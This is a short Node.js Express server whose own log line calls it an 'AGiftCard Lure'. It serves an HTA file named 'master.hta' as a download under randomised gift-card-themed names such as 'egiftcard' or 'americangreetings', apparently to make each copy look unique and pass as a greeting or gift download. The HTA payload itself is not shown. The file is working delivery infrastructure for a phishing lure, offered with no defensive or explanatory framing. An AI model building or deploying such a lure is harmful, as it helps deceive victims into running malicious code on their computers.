const express = require('express');
const path = require('path');
const crypto = require('crypto');
const app = express();
const port = process.env.PORT || 3000;

// Serve static files from /public
app.use(express.static('public'));

// Generate unique themed filename for each visitor
app.get('/api/get-unique-payload', (req, res) => {
    const uniqueId = crypto.randomInt(100000, 999999);
    const themes = ['egiftcard', 'digitalgift', 'americangreetings', 'specialoffer', 'redeemnow'];
    const theme = themes[Math.floor(Math.random() * themes.length)];
    const uniqueName = `${theme}_${uniqueId}.hta`;
    
    res.json({ filename: uniqueName });
});

// Serve the actual HTA with the UNIQUE filename
app.get('/payload/:filename', (req, res) => {
    const filePath = path.join(__dirname, 'public', 'payload', 'master.hta');
    
    res.setHeader('Content-Disposition', `attachment; filename="${req.params.filename}"`);
    res.setHeader('Content-Type', 'application/hta');
    res.sendFile(filePath);
});

app.listen(port, () => {
    console.log(` AGiftCard Lure running on port ${port}`);
});